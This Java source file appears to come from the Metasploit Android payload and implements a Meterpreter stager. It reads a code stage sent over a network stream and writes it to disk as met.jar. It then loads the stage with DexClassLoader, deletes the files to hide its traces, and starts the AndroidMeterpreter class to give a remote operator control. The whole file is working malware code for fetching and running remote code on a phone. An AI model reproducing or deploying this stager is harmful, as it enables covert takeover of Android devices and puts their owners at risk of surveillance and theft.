
package androidpayload.stage;

import dalvik.system.DexClassLoader;

import android.content.Context;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Random;

/**
 * Meterpreter Java Payload Proxy
 */
public class Meterpreter implements Stage {

    public void start(DataInputStream in, OutputStream out, Context context, String[] parameters) throws Exception {
        String path = new File(".").getAbsolutePath();
        String filePath = path + File.separatorChar + "met.jar";
        String dexPath = path + File.separatorChar + "met.dex";

        // Read the stage
        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);

        // Write the stage to /data/data/.../files/
        File file = new File(filePath);
        if (!file.exists()) {
            file.createNewFile();
        }
        FileOutputStream fop = new FileOutputStream(file);
        fop.write(core);
        fop.flush();
        fop.close();

        // Load the stage
        DexClassLoader classLoader = new DexClassLoader(filePath, path, path, Meterpreter.class.getClassLoader());
        Class<?> myClass = classLoader.loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
        file.delete();
        new File(dexPath).delete();
        myClass.getConstructor(new Class[] {
                DataInputStream.class, OutputStream.class, Context.class, boolean.class
        }).newInstance(in, out, context, false);
    }
}
